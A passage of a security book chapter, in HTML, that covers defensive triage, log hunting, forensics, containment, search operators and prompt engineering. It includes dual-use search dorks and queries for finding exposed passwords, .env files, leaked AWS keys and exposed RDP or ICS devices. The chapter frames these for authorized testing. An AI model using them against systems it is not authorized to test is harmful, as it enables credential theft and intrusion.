+  <div class="roles"><span class="role blue">SOC Analyst</span><span class="role blue">Incident Responder</span><span class="role blue">Sysadmin</span><span class="role red">Red (this is what catches you)</span></div>
+  <p>An alert fired, or a box feels wrong. Triage is the first fifteen minutes: what is running, what is connected, who is logged in, what changed. Fast, read-only, and recorded. This is the defensive mirror of Part IV.</p>
+
+  <h4>Linux live triage</h4>
+  <dl class="fm">
+    <div><dt>ps auxf  /  ps -ef --forest</dt><dd>List every process as a <b>tree</b> &mdash; a shell parented to a web server or <code>cron</code> is a red flag.</dd></div>
+    <div><dt>ss -tulpn  /  netstat -tulpn</dt><dd>Show listening ports and the <b>process</b> behind each &mdash; find the backdoor&rsquo;s listener or beacon.</dd></div>
+    <div><dt>ss -tnp state established</dt><dd>List established connections with their processes &mdash; spot the outbound C2 (Ch. 6, Part XI).</dd></div>
+    <div><dt>lsof -p PID  /  lsof -i</dt><dd>Everything a process has open &mdash; files, sockets, deleted-but-held binaries.</dd></div>
+    <div><dt>ls -la /proc/PID/exe /proc/PID/cwd</dt><dd>Reveal a malicious process&rsquo;s real binary and working directory even if deleted from disk.</dd></div>
+    <div><dt>last -a; lastb; w; who</dt><dd>Recent logins, <b>failed</b> logins, and who is on the box right now.</dd></div>
+    <div><dt>stat FILE; ls -la --time-style=full-iso</dt><dd>Exact timestamps &mdash; catch recently dropped or back-dated files.</dd></div>
+  </dl>
+
+  <h4>Windows live triage</h4>
+  <dl class="fm">
+    <div><dt>Get-Process | Sort CPU -desc  /  tasklist /v</dt><dd>Running processes with detail &mdash; the Windows mirror of <code>ps</code>.</dd></div>
+    <div><dt>Get-NetTCPConnection -State Established  /  netstat -ano</dt><dd>Active connections with owning PID &mdash; map a suspect port to its process.</dd></div>
+    <div><dt>Get-CimInstance Win32_Process | select Name,ProcessId,CommandLine</dt><dd>Full <b>command lines</b> &mdash; where the malicious flags and encoded payloads hide.</dd></div>
+    <div><dt>query user  /  quser</dt><dd>Who is logged on, including over RDP.</dd></div>
+    <div><dt>Get-ScheduledTask | ? State -ne Disabled</dt><dd>Enabled scheduled tasks &mdash; a top persistence spot to review (mirror of Part IV).</dd></div>
+    <div><dt>Get-ItemProperty HKLM:\...\Run, HKCU:\...\Run</dt><dd>Read the autorun keys attackers plant for logon persistence.</dd></div>
+  </dl>
+
+  <h4>Quick IOC &amp; integrity checks</h4>
+  <dl class="fm">
+    <div><dt>sha256sum FILE  /  Get-FileHash FILE</dt><dd>Hash a suspect file to check against threat-intel and VirusTotal.</dd></div>
+    <div><dt>cat /etc/passwd; awk -F: '$3==0' /etc/passwd</dt><dd>List accounts and flag any <b>second UID-0</b> (hidden root) account.</dd></div>
+    <div><dt>crontab -l; ls -la /etc/cron.*; systemctl list-timers</dt><dd>Review every scheduling mechanism for unauthorized jobs.</dd></div>
+    <div><dt>debsums -c  /  rpm -Va</dt><dd>Verify installed package files against the distro&rsquo;s known-good hashes &mdash; find tampered binaries.</dd></div>
+  </dl>
+
+  <!-- ===================== PART VI ===================== -->
+  <h2 id="part6">Part VI &mdash; Log Hunting &amp; Detection (Blue)</h2>
+  <div class="roles"><span class="role blue">Threat Hunter</span><span class="role blue">SOC Analyst</span><span class="role blue">Detection Engineer</span></div>
+  <p>You cannot stop what you cannot see. Hunting is turning a mountain of logs into a short list of leads &mdash; with the text tools every Unix user already has, and the event logs Windows keeps whether you ask it to or not.</p>
+
+  <h4>The text-processing core (grep / awk / sed / sort / uniq)</h4>
+  <dl class="fm">
+    <div><dt>grep -rinE "pattern" /var/log</dt><dd>Recursively search logs, case-insensitive, with line numbers &mdash; the start of nearly every hunt.</dd></div>
+    <div><dt>grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</dt><dd>Count failed SSH logins <b>by source IP</b>, ranked &mdash; brute force jumps out instantly.</dd></div>
+    <div><dt>awk '{print $1}' access.log | sort | uniq -c | sort -rn | head</dt><dd>Top talkers in a web log &mdash; find the scanner or the scraper.</dd></div>
+    <div><dt>cut -d: -f1 /etc/passwd | sort</dt><dd>Extract and sort a single field &mdash; the everyday shape of log carving.</dd></div>
+    <div><dt>sed -n '/09:00/,/10:00/p' app.log</dt><dd>Print only the lines in a time window &mdash; scope a log to the incident&rsquo;s hour.</dd></div>
+    <div><dt>grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" log | sort -u</dt><dd>Pull every unique IP address out of any file &mdash; instant IOC list.</dd></div>
+  </dl>
+
+  <h4>Linux system logs</h4>
+  <dl class="fm">
+    <div><dt>journalctl -u ssh --since "1 hour ago"</dt><dd>Query the systemd journal for one service over a time range.</dd></div>
+    <div><dt>journalctl -k -p err</dt><dd>Kernel messages at error level &mdash; surfaces driver, OOM, and tampering signals.</dd></div>
+    <div><dt>ausearch -m USER_LOGIN,EXECVE -ts today</dt><dd>Query the <b>auditd</b> trail for logins and executed commands &mdash; the gold standard Linux audit source.</dd></div>
+    <div><dt>aureport --auth --summary</dt><dd>Summarize authentication events from auditd &mdash; a fast anomaly scan.</dd></div>
+  </dl>
+
+  <h4>Windows event logs (the IDs that matter)</h4>
+  <dl class="fm">
+    <div><dt>Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}</dt><dd><b>4625</b> &mdash; failed logon. Volume and pattern reveal spraying and brute force.</dd></div>
+    <div><dt>... Id=4624</dt><dd><b>4624</b> &mdash; successful logon; <b>Logon Type</b> tells you interactive vs. network vs. RDP (10).</dd></div>
+    <div><dt>... Id=4688</dt><dd><b>4688</b> &mdash; process creation with command line &mdash; the backbone of execution hunting.</dd></div>
+    <div><dt>... Id=4672</dt><dd><b>4672</b> &mdash; special (admin) privileges assigned at logon &mdash; watch for unexpected accounts.</dd></div>
+    <div><dt>... Id=7045</dt><dd><b>7045</b> &mdash; a new <b>service</b> was installed &mdash; a top lateral-movement and persistence signal (psexec).</dd></div>
+    <div><dt>... Id=1102</dt><dd><b>1102</b> &mdash; the Security log was <b>cleared</b> &mdash; a loud anti-forensics alarm (Ch. 6, Part X).</dd></div>
+    <div><dt>wevtutil qe Security /c:20 /rd:true /f:text</dt><dd>Read the last 20 Security events from a plain cmd shell, newest first.</dd></div>
+  </dl>
+
+  <h4>Sysmon &amp; detection-as-code</h4>
+  <dl class="fm">
+    <div><dt>Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"</dt><dd>Read <b>Sysmon</b> &mdash; the free deep telemetry (process, network, image load) every Windows defender should deploy.</dd></div>
+    <div><dt>Sysmon IDs 1 / 3 / 7 / 8 / 11 / 22</dt><dd>Process create / network connect / image load / remote-thread (injection) / file create / DNS query &mdash; the hunt-worthy events.</dd></div>
+    <div><dt>sigma convert -t splunk rule.yml</dt><dd>Compile a vendor-neutral <b>Sigma</b> detection rule into your SIEM&rsquo;s query language &mdash; detections as portable code.</dd></div>
+    <div><dt>grep -rFf iocs.txt /var/log 2&gt;/dev/null</dt><dd>Sweep logs for a whole file of IOCs at once &mdash; threat-intel matching on a budget.</dd></div>
+  </dl>
+
+  <!-- ===================== PART VII ===================== -->
+  <h2 id="part7">Part VII &mdash; Network Defense &amp; Forensics (Blue)</h2>
+  <div class="roles"><span class="role blue">Incident Responder</span><span class="role blue">Forensics / DFIR</span><span class="role blue">Network Defender</span><span class="role blue">Sysadmin</span></div>
+  <p>When triage confirms a compromise, you capture, you contain, and you preserve evidence &mdash; in that order, without destroying what you are trying to understand. This is where the defender slows down and gets it right.</p>
+
+  <h4>Packet capture &amp; traffic analysis</h4>
+  <dl class="fm">
+    <div><dt>tcpdump -i eth0 -nn -w cap.pcap</dt><dd>Capture raw traffic to a file for later analysis &mdash; <code>-nn</code> skips slow name resolution.</dd></div>
+    <div><dt>tcpdump -i eth0 'host 10.10.10.10 and port 443'</dt><dd>Capture only the suspect host and port &mdash; a focused BPF filter keeps the file small.</dd></div>
+    <div><dt>tshark -r cap.pcap -Y "http.request" -T fields -e http.host -e http.request.uri</dt><dd>Extract every HTTP request&rsquo;s host and URI from a capture &mdash; see where a box phoned home.</dd></div>
+    <div><dt>tshark -r cap.pcap -q -z conv,ip</dt><dd>Rank IP conversations by bytes &mdash; find the exfiltration channel (Ch. 6, Part XI).</dd></div>
+    <div><dt>zeek -r cap.pcap</dt><dd>Turn a pcap into rich, queryable logs (conn, dns, http, ssl, files) &mdash; the analyst&rsquo;s force multiplier.</dd></div>
+  </dl>
+
+  <h4>Firewall &amp; containment</h4>
+  <dl class="fm">
+    <div><dt>iptables -A INPUT -s BAD_IP -j DROP</dt><dd>Immediately block a hostile source address.</dd></div>
+    <div><dt>iptables -A OUTPUT -d C2_IP -j DROP</dt><dd>Cut a host&rsquo;s outbound path to its C2 &mdash; contain without powering off (and losing memory).</dd></div>
+    <div><dt>nft add rule inet filter input ip saddr BAD_IP drop</dt><dd>The same block in modern <b>nftables</b> syntax.</dd></div>
+    <div><dt>ufw deny from BAD_IP</dt><dd>One-line block on the simplified Ubuntu firewall.</dd></div>
+    <div><dt>netsh advfirewall firewall add rule name="block" dir=out remoteip=C2_IP action=block</dt><dd>Block outbound to a C2 address on Windows.</dd></div>
+    <div><dt>kill -STOP PID</dt><dd><b>Freeze</b> a malicious process (don&rsquo;t kill it yet) so you can capture its memory and state first.</dd></div>
+  </dl>
+
+  <h4>Evidence acquisition &amp; forensics</h4>
+  <dl class="fm">
+    <div><dt>dd if=/dev/sda of=/mnt/img.dd bs=4M conv=noerror,sync status=progress</dt><dd>Bit-for-bit <b>disk image</b> &mdash; work on the copy, never the original.</dd></div>
+    <div><dt>sha256sum /dev/sda img.dd</dt><dd>Hash source and image &mdash; prove the copy is faithful and preserve chain of custody.</dd></div>
+    <div><dt>avml mem.lime  /  (acquire RAM before shutdown)</dt><dd>Capture volatile <b>memory</b> &mdash; where live keys, injected code, and C2 state live.</dd></div>
+    <div><dt>vol -f mem.lime windows.pslist / netscan / malfind</dt><dd><b>Volatility 3</b> &mdash; list processes, connections, and injected code from a memory image.</dd></div>
+    <div><dt>fls -r -m / img.dd &gt; bodyfile; mactime -b bodyfile</dt><dd>The Sleuth Kit &mdash; build a filesystem <b>timeline</b> of what happened when.</dd></div>
+    <div><dt>strings -n 8 FILE | less  /  binwalk FILE</dt><dd>Pull readable text and carve embedded data from a suspect binary or firmware (Ch. 6, Part XIII).</dd></div>
+    <div><dt>yara -r rules.yar /path  /  clamscan -r /path</dt><dd>Scan disk for known-bad patterns &mdash; YARA for custom signatures, ClamAV for commodity malware.</dd></div>
+    <div><dt>chkrootkit  /  rkhunter --check</dt><dd>Check a Linux host for known rootkits and tampering.</dd></div>
+  </dl>
+
+  <div class="note">
+    <p><strong>Order of volatility.</strong> When you respond, collect evidence from most to least fleeting: <strong>memory and running state first</strong>, then network connections, then disk, then backups and logs already shipped off-box. Pull the power and you lose the memory, the open sockets, and often the only copy of the attacker&rsquo;s keys. Contain at the network, freeze the process, <em>then</em> image.</p>
+  </div>
+
+  <!-- ===================== PART VIII ===================== -->
+  <h2 id="part8">Part VIII &mdash; The Prompt Field Manual</h2>
+  <div class="roles"><span class="role prompt">OSINT</span><span class="role prompt">Researcher</span><span class="role prompt">Vibe Coder</span><span class="role red">Red</span><span class="role blue">Blue</span></div>
+  <p>This is the manual the old field manuals never had. Two languages run the modern operator&rsquo;s day that <code>nmap</code> and <code>grep</code> never touched: the <strong>query language of search engines</strong> (Google-Fu &mdash; the art I have practiced for twenty years) and the <strong>instruction language of large language models</strong> (prompt engineering &mdash; Chapter 5&rsquo;s whole premise). Both are command sets. Both reward precision. Both are, done well, a genuine force multiplier &mdash; and both are neutral tools governed by the same authorization rule as every other command in this book.</p>
+
+  <h3>VIII-A &mdash; Google-Fu: the search operators</h3>
+  <p>A search box is a query interpreter, and these operators are its flags. They are the executable form of Chapter 6&rsquo;s reconnaissance &mdash; and the heart of the Google Hacking Database that Johnny Long (Chapter 2) built. Combine them; that is where the power is.</p>
+
+  <h4>Core operators</h4>
+  <dl class="fm">
+    <div><dt>"exact phrase"</dt><dd>Match the words <b>exactly</b>, in order &mdash; the single most useful operator.</dd></div>
+    <div><dt>site:example.com</dt><dd>Restrict results to one <b>domain</b> &mdash; map everything a site has indexed.</dd></div>
+    <div><dt>-term</dt><dd><b>Exclude</b> a word &mdash; strip the noise (e.g. <code>-site:pinterest.com</code>).</dd></div>
+    <div><dt>OR  (or the pipe |)</dt><dd>Match <b>either</b> term &mdash; <code>(ceo OR founder) email</code>.</dd></div>
+    <div><dt>( )</dt><dd>Group terms to control logic &mdash; <code>site:gov (breach OR incident)</code>.</dd></div>
+    <div><dt>*</dt><dd><b>Wildcard</b> for an unknown word inside a phrase &mdash; <code>"the * of security"</code>.</dd></div>
+    <div><dt>filetype:pdf  /  ext:xlsx</dt><dd>Return only a given <b>file type</b> &mdash; the operator behind most document-leak dorks.</dd></div>
+    <div><dt>intitle:"index of"</dt><dd>Match words in the page <b>title</b> &mdash; the classic open-directory finder.</dd></div>
+    <div><dt>inurl:admin</dt><dd>Match words in the <b>URL</b> &mdash; login panels, admin paths, parameters.</dd></div>
+    <div><dt>intext:"confidential"</dt><dd>Match words in the page <b>body</b> &mdash; find content regardless of title.</dd></div>
+    <div><dt>allintitle: / allinurl:</dt><dd>Require <b>all</b> following words in the title / URL respectively.</dd></div>
+    <div><dt>related:example.com</dt><dd>Find sites <b>similar</b> to a known one &mdash; competitor and infrastructure mapping.</dd></div>
+    <div><dt>before:2024-01-01  /  after:2023-01-01</dt><dd>Bound results by <b>date</b> &mdash; essential for incident and news timelines.</dd></div>
+    <div><dt>AROUND(5)</dt><dd>Require two terms <b>within N words</b> of each other &mdash; <code>smith AROUND(5) darpa</code>.</dd></div>
+  </dl>
+
+  <h4>Operator recipes (OSINT &amp; defense)</h4>
+  <dl class="fm">
+    <div><dt>site:TARGET ext:pdf OR ext:docx OR ext:xlsx</dt><dd>Surface a target&rsquo;s indexed documents &mdash; where metadata and secrets leak.</dd></div>
+    <div><dt>site:TARGET intitle:"index of" (password OR backup OR .env)</dt><dd>Find open directories exposing sensitive files &mdash; run this on <b>your own</b> domain first.</dd></div>
+    <div><dt>site:pastebin.com TARGET</dt><dd>Hunt for leaked credentials and data dumps mentioning your organization.</dd></div>
+    <div><dt>"COMPANY" site:linkedin.com intitle:(engineer OR admin)</dt><dd>Build an org chart for authorized social-engineering tests (Ch. 6, Part IV).</dd></div>
+    <div><dt>inurl:(login OR admin OR portal) site:TARGET</dt><dd>Enumerate a target&rsquo;s authentication surface from the index alone.</dd></div>
+  </dl>
+
+  <h4>Beyond Google &mdash; the specialist engines</h4>
+  <dl class="fm">
+    <div><dt>shodan: port:3389 country:US product:...</dt><dd><b>Shodan</b> &mdash; the search engine for internet-connected <b>devices</b>; find exposed RDP, cameras, ICS (Ch. 6, Parts II, XVI).</dd></div>
+    <div><dt>GitHub: "TARGET" AKIA  (or filename:.env)</dt><dd>Code search for leaked <b>API keys and secrets</b> &mdash; audit your own org constantly.</dd></div>
+    <div><dt>Google Scholar: "term" author:"Name" source:"Journal"</dt><dd>Scholarly search operators &mdash; find peer-reviewed sources (the research spine of this book).</dd></div>
+    <div><dt>Scholar: cited by / "Cite" &rarr; BibTeX</dt><dd>Trace a paper&rsquo;s influence and export clean citations &mdash; the researcher&rsquo;s shortcut.</dd></div>
+    <div><dt>archive.org/web  /  cache operators</dt><dd>Retrieve <b>historical</b> versions of a page &mdash; find what a site used to expose.</dd></div>
+  </dl>
+
+  <h3>VIII-B &mdash; Prompt Engineering: the instruction commands</h3>
+  <p>A prompt is a program written in English, and these are its control structures. They are not magic words; they are reliable <em>levers</em> that change how a model reasons, formats, and grounds its answer. I have used every one of these to build what Chapter 5 describes &mdash; the books, the apps, the DARPA proposals &mdash; from a Chromebook. Think of each as a command, with a function.</p>
+
+  <h4>Structure &amp; role commands</h4>
+  <dl class="fm">
+    <div><dt>Role / persona: "You are a senior malware analyst."</dt><dd>Set the model&rsquo;s expertise and voice &mdash; narrows its output to the right domain and register.</dd></div>
+    <div><dt>Delimiters: """ ... """  or  &lt;context&gt; ... &lt;/context&gt;</dt><dd>Fence the data from the instructions &mdash; the practical defense against prompt injection (Ch. 6, Part XVII).</dd></div>
+    <div><dt>System vs. user message</dt><dd>Put durable rules in the <b>system</b> prompt, the task in the <b>user</b> turn &mdash; separates policy from request.</dd></div>
+    <div><dt>Output spec: "Return valid JSON: {name, risk, fix}"</dt><dd>Pin the exact <b>shape</b> of the answer &mdash; makes output parseable by your code.</dd></div>
+    <div><dt>Constraints: "&le; 200 words. Cite every claim. No preamble."</dt><dd>Bound length, sourcing, and style &mdash; the difference between usable and rambling.</dd></div>
+  </dl>
+
+  <h4>Reasoning &amp; accuracy commands</h4>
+  <dl class="fm">
+    <div><dt>Zero-shot</dt><dd>Just ask, no examples &mdash; the baseline; fine for simple, well-known tasks.</dd></div>
+    <div><dt>Few-shot: give 2&ndash;5 input&rarr;output examples</dt><dd><b>Show</b> the pattern instead of describing it &mdash; the most reliable way to fix format and tone (Brown et al., 2020).</dd></div>
+    <div><dt>Chain-of-thought: "Think step by step."</dt><dd>Make the model <b>reason before answering</b> &mdash; large accuracy gains on multi-step problems (Wei et al., 2022).</dd></div>
+    <div><dt>Decomposition: "List the sub-tasks first, then solve each."</dt><dd>Break a hard task into ordered steps &mdash; fewer skipped requirements.</dd></div>
+    <div><dt>Self-critique: "Review your answer for errors, then correct it."</dt><dd>A second reflective pass that catches its own mistakes (the Reflexion / self-refine pattern).</dd></div>
+    <div><dt>Grounding / RAG: "Answer only from the text below; if absent, say so."</dt><dd>Tie the answer to supplied sources &mdash; the strongest single curb on hallucination.</dd></div>
+    <div><dt>"Cite sources and flag any uncertainty."</dt><dd>Force attribution and calibrated doubt &mdash; the research-ethics rule this whole book is written under.</dd></div>
+  </dl>
+
+  <h4>Agentic &amp; coding commands (the vibe-coder&rsquo;s set)</h4>
+  <dl class="fm">
+    <div><dt>ReAct: "Reason, then choose a tool, observe, repeat."</dt><dd>The loop behind tool-using <b>agents</b> &mdash; interleave thinking with actions (Yao et al., 2022; Chapter 9).</dd></div>
+    <div><dt>"Plan first. Wait for my approval before editing files."</dt><dd>Keep a human in the loop &mdash; the core safety control for agents (Ch. 6, Part XVII).</dd></div>
+    <div><dt>"Write a failing test first, then code until it passes."</dt><dd>Test-driven prompting &mdash; turns the model&rsquo;s output into something verifiable, not just plausible.</dd></div>
+    <div><dt>"Explain the diff and its security impact before applying."</dt><dd>Force review of AI-written code &mdash; the answer to the 1.7&times; bug-rate finding in Chapter 5.</dd></div>
+    <div><dt>Iterate: "Keep what works; change only X."</dt><dd>Preserve a good result while refining one dimension &mdash; the real rhythm of vibe coding.</dd></div>
+  </dl>
+
+  <div class="lessons">
+    <h3>The anti-patterns (what breaks a prompt)</h3>
+    <ul>
+      <li><strong>Vagueness.</strong> &ldquo;Make it better&rdquo; has no function. Name the dimension &mdash; shorter, safer, faster, cited.</li>
+      <li><strong>Overload.</strong> Ten tasks in one prompt get averaged into mush. Decompose and sequence.</li>
+      <li><strong>Trusting without verifying.</strong> A fluent answer is not a correct one. Ground it, test it, check the citations &mdash; the model can be confidently wrong (Chapter 5&rsquo;s whole caution).</li>
+      <li><strong>Leaking instructions into data.</strong> If untrusted text can reach the model, assume it will try to issue commands. Fence it, and never give an agent more power than the task needs.</li>
+    </ul>
+  </div>
+
+  <!-- ===================== PART IX ===================== -->
+  <h2 id="part9">Part IX &mdash; The Jobs: Which Parts Are Yours</h2>
+  <p>I combined the manuals because the roles overlap &mdash; but you came here with a job to do. This is the map from the work you were hired for to the parts you will live in. Read your rows first, then read your opposite&rsquo;s, because the operator who understands both sides is the one who wins.</p>
+
+  <table class="jobs">
+    <thead><tr><th>The job</th><th>Side</th><th>Parts you live in</th></tr></thead>
+    <tbody>
+      <tr><td>Penetration Tester</td><td class="side" style="color:var(--danger)">Red</td><td>II, III, IV &mdash; full offensive chain; VIII-A for recon.</td></tr>
+      <tr><td>Red Teamer / Operator</td><td class="side" style="color:var(--danger)">Red</td><td>II&ndash;IV with discipline from the Part IV box; VIII-A/B for OSINT and tooling.</td></tr>
+      <tr><td>Bug Bounty Hunter</td><td class="side" style="color:var(--danger)">Red</td><td>II (web) and III (web exploitation); VIII-A to find scope and leaks.</td></tr>
+      <tr><td>SOC Analyst</td><td class="side" style="color:var(--accent2)">Blue</td><td>V and VI &mdash; triage and log hunting; read II&ndash;IV to know the attacks.</td></tr>
+      <tr><td>Incident Responder</td><td class="side" style="color:var(--accent2)">Blue</td><td>V, VI, VII &mdash; triage through forensics and containment.</td></tr>
+      <tr><td>Threat Hunter</td><td class="side" style="color:var(--accent2)">Blue</td><td>VI primarily; VII for pcap; IV to know what you are hunting.</td></tr>
+      <tr><td>DFIR / Forensics</td><td class="side" style="color:var(--accent2)">Blue</td><td>VII above all &mdash; evidence, memory, timelines; V for the first hour.</td></tr>
+      <tr><td>Sysadmin / DevOps</td><td class="side" style="color:var(--accent2)">Blue</td><td>I, V, VII (firewall/hardening); the whole book&rsquo;s Chapter 8 is yours next.</td></tr>
+      <tr><td>Researcher / OSINT</td><td class="side" style="color:var(--accent)">Prompt</td><td>VIII-A and VIII-B &mdash; search operators and grounded, cited prompting.</td></tr>
+      <tr><td>Vibe Coder / Builder</td><td class="side" style="color:var(--accent)">Prompt</td><td>VIII-B &mdash; the agentic and coding command set; I for your environment.</td></tr>
+    </tbody>
+  </table>
+
+  <p>Notice the last column of nearly every blue row points back into the red parts, and every red row leans on the prompt parts. That is the thesis of this chapter in one glance: <strong>the commands do not belong to a side.</strong> A packet capture is offense when you read someone else&rsquo;s traffic and defense when you read your own; a prompt is recon when it finds a leak and research when it cites a paper. What assigns the command to red or blue, to felony or profession, is never the syntax. It is the authorization, and what you choose to do with it.</p>
+
+  <div class="danger">
+    <span class="tag">The one rule, one last time</span>
+    <p>You now hold working commands for finding, breaking, defending, and investigating real systems. Run the offensive ones only against your own lab (Chapter 5) or a target whose owner signed a scope. Run the defensive ones on the systems you are paid to protect. Everything else &mdash; the neighbor&rsquo;s Wi-Fi, the ex-employer&rsquo;s portal, the &ldquo;just looking&rdquo; scan of a stranger &mdash; is Chapter 10&rsquo;s subject and, in the United States, a federal crime under the CFAA. The skill is real. The line is permission. Stay on the right side of it, and this manual is the start of a career. Cross it, and it is the start of a case file.</p>
+  </div>
+
+  <p class="signoff">This was the working half of <em>A Hacker&rsquo;s Guide to Survive</em> &mdash; red, blue, and prompt in one manual, because the best operators think in all three. Next, <strong>Chapter 8 &mdash; The Machines That Hack</strong> goes deep on the AI and automation now running on both sides of the line: the agents that scan and defend without sleeping, and what it means to command them well.</p>
+
+  <!-- ===================== SOURCES ===================== -->
+  <h2 id="sources" style="border-bottom:none; margin-bottom:8px;">Sources &amp; Standards</h2>
+  <p class="refs-group">The field-manual tradition</p>
+  <ul class="refs">
+    <li>Ben Clark, <em>RTFM: Red Team Field Manual</em> (v2, 2022) &mdash; the format this chapter honors.</li>
+    <li>Alan J. White &amp; Ben Clark, <em>BTFM: Blue Team Field Manual</em> (2017) &mdash; the defensive companion.</li>
+    <li>Peter Kim, <em>The Hacker Playbook 3</em> (2018); OccupyTheWeb, <em>Linux Basics for Hackers</em> (No Starch, 2019).</li>
+    <li>GTFOBins (<a href="https://gtfobins.github.io/">gtfobins.github.io</a>) and LOLBAS (<a href="https://lolbas-project.github.io/">lolbas-project.github.io</a>) &mdash; living references for abusing trusted binaries.</li>
+    <li>PEASS-ng (LinPEAS/WinPEAS), Impacket, BloodHound, and the Metasploit Framework &mdash; the tooling cited throughout.</li>
+  </ul>
+  <p class="refs-group">Defense, detection &amp; forensics</p>
+  <ul class="refs">
+    <li>MITRE ATT&amp;CK&reg; (<a href="https://attack.mitre.org/">attack.mitre.org</a>) and the Sigma project (<a href="https://sigmahq.io/">sigmahq.io</a>) &mdash; detection mapped and written as portable code.</li>
+    <li>Microsoft Sysmon and the Windows Security event-ID reference; the SANS DFIR posters and &ldquo;Order of Volatility&rdquo; (RFC 3227).</li>
+    <li>The Volatility Foundation (memory forensics), The Sleuth Kit (filesystem forensics), Zeek, and YARA.</li>
+    <li>CISA incident-response playbooks and the NIST SP 800-61 <em>Computer Security Incident Handling Guide</em>.</li>
+  </ul>
+  <p class="refs-group">Search &amp; prompt engineering</p>
+  <ul class="refs">
+    <li>Johnny Long, <em>Google Hacking for Penetration Testers</em>, and the Google Hacking Database (Exploit-DB) &mdash; Chapter 2&rsquo;s figure, applied.</li>
+    <li>Brown et al., &ldquo;Language Models are Few-Shot Learners&rdquo; (2020); Wei et al., &ldquo;Chain-of-Thought Prompting&rdquo; (2022); Yao et al., &ldquo;ReAct&rdquo; (2022); Shinn et al., &ldquo;Reflexion&rdquo; (2023).</li>
+    <li>OWASP Top 10 for LLM Applications (<a href="https://genai.owasp.org/">genai.owasp.org</a>) &mdash; the injection and agency risks the prompt commands defend against (Ch. 6, Part XVII).</li>
+    <li>Anthropic and OpenAI prompt-engineering guides &mdash; vendor references for the command patterns above.</li>
+  </ul>
+
+  <div class="note">
+    <p><strong>A note on this chapter.</strong> This is a defensive and educational reference for security professionals and for testing performed only with explicit authorization. Commands are given in their standard, documented forms; placeholders in capitals (<code>TARGET</code>, <code>IP</code>, <code>USER</code>) are yours to fill with systems you own or are contracted to assess. Flags and syntax evolve &mdash; <code>man</code> and <code>--help</code> are the final authority on your system. This chapter is built and expanded across editions, as new tools, new event sources, and new prompt patterns earn their place.</p>
+  </div>
+
+  <p class="signoff">Malcolm R. Smith is the founder of Savvy Security LLC and has answered to &ldquo;hacker&rdquo; for the better part of thirty years. He writes on security architecture, hacker culture, and autonomous defense. This is Chapter 7 of <em>A Hacker&rsquo;s Guide to Survive</em>, a living compendium published once a year.</p>
+
+  <nav class="chapnav">
+    <a href="../ch06-compendium-of-attacks/">&larr; Chapter 6 &mdash; The Compendium of Attacks</a>
+    <a href="../">Next: Chapter 8 &mdash; The Machines That Hack &rarr;</a>
+  </nav>
+</main>
+<footer>Savvy Security LLC &middot; A Hacker&rsquo;s Guide to Survive</footer>
+</body>
+</html>
